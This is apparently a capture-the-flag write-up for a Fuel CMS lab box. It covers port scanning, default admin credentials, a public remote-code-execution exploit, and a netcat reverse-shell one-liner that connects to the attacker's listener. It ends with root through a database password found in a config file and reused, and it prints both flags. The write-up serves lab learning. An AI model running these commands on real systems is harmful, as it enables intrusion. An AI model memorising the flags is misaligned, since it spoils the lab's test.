
---

### Nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

```

![[ignite-banner.png]]


> http://10.10.112.35/robots.txt
```
User-agent: *
Disallow: /fuel/
```


![[ignite-cred.png]]

### Credentials

> [http://10.10.240.208/fuel](http://10.10.240.208/fuel)

`admin` : `admin`

### Exploits

> searchsploit fuel cms

```
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                  | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                  | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                  | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated) | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)        | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authentic | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)          | php/webapps/50884.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```


### Initial Foothold

```
$ python2 47138.py
cmd:id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)

--SNIP--

```

**reverse shell payload**:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.17 9999 >/tmp/f`

`nc -lnvp 9999`

```
$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.9.3.17] from (UNKNOWN) [10.10.241.205] 51334
/bin/sh: 0: can't access tty; job control turned off
$ 
```

**flag.txt**

`6470e394cbf6dab6a91682cc8585059b`

### Privilage Escalation


Found configuration files:

```
www-data@ubuntu:/var/www/html$ ls
ls
README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
```

Lets try to find password reuse:

```
www-data@ubuntu:/var/www/html$ ls fuel
ls fuel
application  data_backup  install   modules
codeigniter  index.php	  licenses  scripts
```

most of them are empty, or not interesting

```
www-data@ubuntu:/var/www/html/fuel$ cd application
cd application
www-data@ubuntu:/var/www/html/fuel/application$ ls
ls
cache	controllers  helpers  index.html  libraries  migrations  third_party
config	core	     hooks    language	  logs	     models	 views
```

Found config directory,
let's search for something interesting

```
www-data@ubuntu:/var/www/html/fuel/application$ cd config
cd config
www-data@ubuntu:/var/www/html/fuel/application/config$ ls
ls
MY_config.php	     constants.php	google.php     profiler.php
MY_fuel.php	     custom_fields.php	hooks.php      redirects.php
MY_fuel_layouts.php  database.php	index.html     routes.php
MY_fuel_modules.php  doctypes.php	memcached.php  smileys.php
asset.php	     editors.php	migration.php  social.php
autoload.php	     environments.php	mimes.php      states.php
config.php	     foreign_chars.php	model.php      user_agents.php
```

Found database.php, may contain root password (password reuse)
let's look into it.

```
--SNIP--

$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);

--SNIP--
```

Found
```
'username' => 'root'
'password' => 'mememe'
```

Let's try `root` with `mememe`

```
www-data@ubuntu:/var/www/html/fuel/application/config$ su -
su -
Password: mememe

root@ubuntu:~#
```

Got it!

**root.txt**

`b9bbcb33e11b80be759c4e844862482d`
